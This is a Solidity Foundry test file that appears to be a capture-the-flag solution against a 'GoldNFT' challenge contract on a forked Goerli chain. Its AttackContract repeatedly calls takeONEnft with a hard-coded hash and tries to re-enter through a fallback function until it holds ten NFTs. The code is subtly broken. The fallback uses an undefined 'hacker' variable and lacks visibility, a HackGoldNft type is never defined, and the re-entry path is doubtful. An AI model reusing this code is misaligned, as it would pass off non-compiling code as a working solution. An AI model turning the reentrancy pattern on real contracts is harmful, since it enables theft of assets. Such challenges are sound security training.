// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/GoldNFT.sol";

contract Hack is Test {
    GoldNFT nft;
    HackGoldNft nftHack;
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() external {
        vm.createSelectFork("goerli", 8591866); 
        nft = new GoldNFT();
    }

    function test_Attack() public {
        vm.startPrank(hacker);

        // solution
        AttackContract attackContract = new AttackContract(nft);
        
        assertEq(nft.balanceOf(hacker), 10);
    }
}

contract AttackContract {
    GoldNFT nft;

    constructor(GoldNFT _nft) {
        nft = _nft;
        nft.takeONEnft(0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe);
    }

    fallback() {
        if (nft.balanceOf(hacker) < 10) {
            nft.takeONEnft(0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe);
        }
    }
}